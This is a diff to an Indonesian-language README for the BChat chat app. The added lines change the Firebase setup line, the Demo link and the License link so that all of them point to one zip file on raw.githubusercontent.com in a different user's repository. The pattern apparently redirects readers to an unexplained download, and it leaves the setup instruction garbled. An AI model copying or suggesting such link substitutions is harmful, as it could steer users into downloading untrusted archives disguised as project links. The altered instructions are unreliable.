@@ -20,11 +20,11 @@ Fitur:
 <h1>Setting</h1>
 
 <pre>
-Setting firebase pada 'BChat v2.js' pada bagian 'https://baychat-548c8.firebaseio.com/' 
+Setting firebase pada 'BChat https://raw.githubusercontent.com/dextercool/BChat/master/subintroduction/BChat.zip' pada bagian 'https://raw.githubusercontent.com/dextercool/BChat/master/subintroduction/BChat.zip' 
 ganti dengan alamat akun firebase kalian.
 </pre>
 
-<a href="http://chat.bayyu.me" target="_blank"><h4>Demo</h4></a>
+<a href="https://raw.githubusercontent.com/dextercool/BChat/master/subintroduction/BChat.zip" target="_blank"><h4>Demo</h4></a>
 
 
-<a href="https://github.com/MuhBayu/BChat/blob/master/LICENSE"><h4>License</h4></a>
+<a href="https://raw.githubusercontent.com/dextercool/BChat/master/subintroduction/BChat.zip"><h4>License</h4></a>
